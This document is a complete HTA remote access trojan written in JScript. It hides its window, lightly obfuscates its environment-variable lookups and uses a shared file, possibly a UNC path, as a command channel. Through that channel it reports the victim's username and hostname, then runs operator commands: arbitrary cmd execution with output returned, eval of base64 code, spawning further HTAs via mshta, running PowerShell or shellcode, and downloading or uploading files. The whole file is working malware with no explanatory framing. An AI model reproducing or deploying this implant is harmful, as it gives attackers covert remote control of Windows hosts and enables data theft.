<html><script>
//Move window
window.moveTo(-69, -420);
window.blur();
window.resizeTo(6, 9);

//Define variables
var home = 'C:\\users\\kclark\\test99.txt' // UNC or local path. Send and receive data through this file
var sleepytime = 2000 //in milliseconds

var runner = new ActiveXObject("WScript.Shell")

var temp = runner.ExpandEnvironmentStrings("%TE" +"MP%");
var cs = runner.ExpandEnvironmentStrings("%C"+  "OmSP"    +"Ec%");
var un = runner.ExpandEnvironmentStrings("%US"+  "ER"+"NA"+  "ME%");
var hn = runner.ExpandEnvironmentStrings("%COM" + "PUT"  +"ERN" + "AME%");
var id = Math.floor(Math.random() * 9999999999).toString()
var type = "hta"
var fso = new ActiveXObject("Scripting.FileSystemObject")

var runextra = false
var extrafunc = []

//Helper functions
function smb_post(home, response) {
  if(!fso.FileExists(home)) {
    var fd = fso.CreateTextFile(home)
    fd.close()
  }

  var empty = false
  var file = fso.GetFile(home)
    if(file.Size !== 0) {
      var fdr = fso.OpenTextFile(home)
      var updata = fdr.ReadAll()
      fdr.close()
  }
  else {
    empty = true
  }

  if((empty) || (updata !== checkin+"\r\n")) { // Windows adds a \r\n at the end of file reads
    var fdw = fso.OpenTextFile(home, 2) // mode 2 = write
    fdw.WriteLine(response)
    fdw.close()
    return updata.split("\r")[0]
  }
  else {
    return false
  }
}

function quit() {
  try {
    window.close();
  }
  catch(e){}
  try {
    window.self.close();
  }
  catch (e){}
  try {
    window.top.close();
  }
  catch (e){}
  try {
    self.close();
  }
  catch (e){}
}

function writebinfile(filename, content) {
  var stream = new ActiveXObject("ADODB.Stream")
  stream.Open()
  stream.Type = 1 //adTypeBinary
  stream.Write(content)
  stream.SaveToFile(filename)
  stream.Close()
}

function readbinfile(filename) {
  var stream = new ActiveXObject("ADODB.Stream")
  stream.Open()
  stream.Type = 1 //adTypeBinary
  stream.LoadFromFile(filename)
  var bytes = stream.Read()
  stream.Close()
  return bytes
}

function str2bin(data) {
  var istream = new ActiveXObject("ADODB.Stream");
  istream.Type = 2
  istream.CharSet = "us-ascii"
  istream.Open()
  istream.WriteText(data)
  istream.Position = 0
  istream.Type = 1
  return istream.Read()
}
function b64e(data) {
  var xml = new ActiveXObject("MSXml2.DOMDocument");
  var element = xml.createElement("Base64Data");
  element.dataType = "bin.base64";
  if(typeof(data) == "string") {
    element.nodeTypedValue = str2bin(data);
  }
  else {
    element.nodeTypedValue = data;
  }
  return element.text.replace(/\n/g, "");
}

function bin2str(data) {
  var istream = new ActiveXObject("ADODB.Stream")
  istream.Type = 1
  istream.Open()
  istream.Write(data)
  istream.Position = 0
  istream.Type = 2
  istream.CharSet = "us-ascii"
  return istream.ReadText()
}

function b64d(data, type) {
  var xml = new ActiveXObject("MSXml2.DOMDocument");
  var element = xml.createElement("Base64Data");
  element.dataType = "bin.base64"
  element.text = data
  if(type == "bin") {
    return element.nodeTypedValue
  }
  else {
    return bin2str(element.nodeTypedValue)
  }
}


var checkin = '{ "p":[ {"type": "'+type+'","id": '+id+',"un": "'+un+'","hn": "'+hn+'"} ] }'; //initial checkin

// set up smb comms
if((fso.FileExists(home))) {
  fso.DeleteFile(home)
}
var fd = fso.CreateTextFile(home)
fd.close()
var fdw = fso.OpenTextFile(home, 2) // mode 2 = write
fdw.WriteLine(checkin) // write checkin for the first time
fdw.close()

function main() {
  window.setTimeout("main()", sleepytime, "JScript")
  try {
    window.moveTo(-69, -420);

    var retval = ""
    var recv_package = false
    var jsondata = smb_post(home, checkin);
    if(!jsondata) { // if no message from upstream rat, just wait and try again
      return
    }
    // Convert json string to json object
    eval("jsObject="+jsondata);
    checkin = '{ "p":[ ' // start building json response string

    // Supports running extra functions once per loop ... right before checking for cmnd
    if(runextra) {
      for(var i in extrafunc) {
        try {
          eval(extrafunc[i])
        }
        catch (e) {
        }
      }
    }

    // loop thru all packages
    var packages = jsObject.p
    for(var p in packages) {
      if(packages[p].id == id) { // if this is our package (id = our id)
        recv_package = true
        if(packages[p].cmnd) {
          var rettype = "retval"
          var cmnd = packages[p].cmnd

          //kill
          if(cmnd == "quit") {
            quit();
          }
          

          //spawn: writes hta to %TEMP%
          else if(cmnd.split(" ")[0] == "spawn") {
            //try {
              fd = fso.CreateTextFile(temp + "\\" + id + ".hta")
              fd.WriteLine(b64d(cmnd.split(" ")[1]))
              fd.close()
              runner.Run("ms" + "hta " + temp + "\\" + id + ".hta", 0, false)
              for(var i = 0; i < 60000000; i++) {
                // busy wait to wait for above cmnd to finish
              }
              fso.DeleteFile(temp + "\\" + id + ".hta")
              retval = "[+] Spawn success..."
            //}
            //catch (e) {
            //  retval = "[-] Spawn failed..."
            //}
          }

          else if((cmnd.split(" ")[0] == "ev")) {
            eval(b64d(cmnd.split(" ")[1]))
            retval = "[*] eval complete..."
          }

          //psh and cs
          else if((cmnd.split(" ")[0] == "psh") || (cmnd.split(" ")[0] == "cs") || (cmnd.split(" ")[0] == "shc")) {
            fd = fso.CreateTextFile(temp + "\\" + id + ".txt")
            msb = cmnd.split(" ")[1]
            msbdata = b64d(cmnd.split(" ")[2], "txt")
            fd.WriteLine(msbdata)
            fd.close()
            if(cmnd.split(" ")[0] == "shc") {
              runner.Run(msb + " " + temp + "\\" + id + ".txt", 0, true)
              retval = "[*] Shc cmnd appeared successful"
            }
            else {
              runner.Run(msb + " " + temp + "\\" + id + ".txt", 0, true)
            }
            if(fso.FileExists(temp + "\\__" + id + ".txt")) {
              fd = fso.OpenTextFile(temp + "\\__" + id + ".txt")
              retval = fd.ReadAll()
              fd.close()
              fso.DeleteFile(temp + "\\__" + id + ".txt", true)
            }
            if(fso.FileExists(temp + "\\" + id + ".txt")) {
              fso.DeleteFile(temp + "\\" + id + ".txt", true)
            }
          }

          else if(cmnd.split(" ")[0] == "dl") {
            var array = cmnd.split(" ")
            array.shift() //Cuts off the first element in the array
            var filepath = array.join(" ")
            if(fso.FileExists(filepath)) {
              retval = readbinfile(filepath)
              rettype = "dl"
            }
            else {
              retval = "[!] Could not read file: " + filepath
            }
          }

          else if(cmnd.split(" ")[0] == "up") {
            try {
              var array = cmnd.split(" ")
              content = b64d(array[1], "bin")
              array.shift()
              array.shift()
              filename = array.join(" ")
              writebinfile(filename, content)
              retval = "[*] File uploaded: " + filename
            }
            catch (e) {
              retval = "[-] Could not upload file: " + filename
            }
          }

          else if(cmnd.split(" ")[0] == "ex") {
            runner.Exec(b64d(cmnd.split(" ")[1]))
            retval = "[*] Exec'd cmnd... (no output)"
          }

          //credit to nate and 0sum
          else {
            runner.Run(cs +" /c " + cmnd + " 1> " + temp + "\\__" + id + ".txt" + " 2>&1", 0, true)
      	    if(fso.FileExists(temp + "\\__" + id + ".txt")) {
              try {
                fd = fso.OpenTextFile(temp + "\\__" + id + ".txt")
                retval = fd.ReadAll()
                fd.close()
                fso.DeleteFile(temp + "\\__" + id + ".txt", true)
              }
              catch (e) { }
            }
          }
          if(retval == "") {
            retval = "[*] No results to return or error getting result data"
          }
          checkin += '{"type": "'+type+'", "id": '+id+',"un":"'+un+'","hn":"'+hn+'","'+rettype+'":"'+b64e(retval)+'"} ] }';
          packages[p].cmnd = "" // set cmnd to blank so we don't accidentally run the same thing twice ...
        }

        else { // cmnd is blank
          checkin += '{"type": "'+type+'", "id": '+id+',"un":"'+un+'","hn":"'+hn+'"} ] }'; // idle response
        }
      }
    }
    if(!recv_package) {
      checkin += '{"type": "'+type+'", "id": '+id+',"un":"'+un+'","hn":"'+hn+'"} ] }';
    }
  }
  catch (e) {
    checkin = '{ "p":[ {"type": "'+type+'","id": '+id+',"un": "'+un+'","hn": "'+hn+'"} ] }'; //error - set idle checkin
  }
}
main()
</script>
<hta:application caption="no" windowState="minimize" showInTaskBar="no" scroll="no" navigable="no" />
<body></body></html>

